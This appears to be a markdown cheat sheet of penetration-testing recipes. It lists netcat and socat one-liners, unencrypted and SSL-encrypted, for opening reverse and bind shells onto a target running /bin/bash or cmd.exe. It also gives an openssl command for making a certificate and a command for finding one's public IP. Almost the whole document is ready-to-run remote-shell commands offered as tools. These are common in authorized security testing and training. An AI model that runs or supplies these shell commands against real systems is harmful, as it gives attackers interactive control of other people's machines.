# tools

## Reverse Shells
Recipes for reverse shells from A to target B:

### Netcat
A: `nc -nlvp 4444`  
B: `nc -nv $A_IP $PORT -e /bin/bash`  

### Socat
#### Unencrypted
A: `socat -d -d TCP4-LISTEN:$PORT STDOUT`  
B (Linux): `socat TCP4:$A_IP:$PORT EXEC:/bin/bash`  
B (Windows): `socat TCP4:$A_IP:4433 EXEC:'cmd.exe',pipes`  

#### Encrypted
This requires you to create a self-signed SSL certificate.  

A: `socat -d -d OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork STDOUT`  
B (Linux): `socat OPENSSL:$A_IP:$PORT,verify=0 EXEC:/bin/bash`  
B (Windows): `socat OPENSSL:$A_IP:$PORT,verify=0 EXEC:'cmd.exe',pipes`  

## Bind Shells
Recipes for bind shells from A to target B:  

### Netcat
A: `nc -nv $B_IP $PORT`  
B: `nc -nlvp $PORT -e /bin/bash`  

### Socat
#### Unencrypted
A: `socat - TCP4:$B_IP:$PORT`  
B (Linux): `socat -d -d TCP4-LISTEN:$PORT EXEC:/bin/bash`  
B (Windows): `socat -d -d TCP4-LISTEN:$PORT EXEC:'cmd.exe',pipes`  

#### Encrypted
This requires you to create a self-signed SSL certificate.  

A: `socat - OPENSSL:$B_IP:$PORT,verify=0 STDOUT`  
B machine (Linux): `socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXEC:/bin/bash`  
B machine (Windows): `socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXEC:'cmd.exe',pipes`  

## Self-Signed SSL Certificate
`openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 10 -out cert.crt && cat cert.key cert.crt > cert.pem`  

## Get Public IP
To get your public IP address on Linux run `dig +short myip.opendns.com @resolver1.opendns.com`  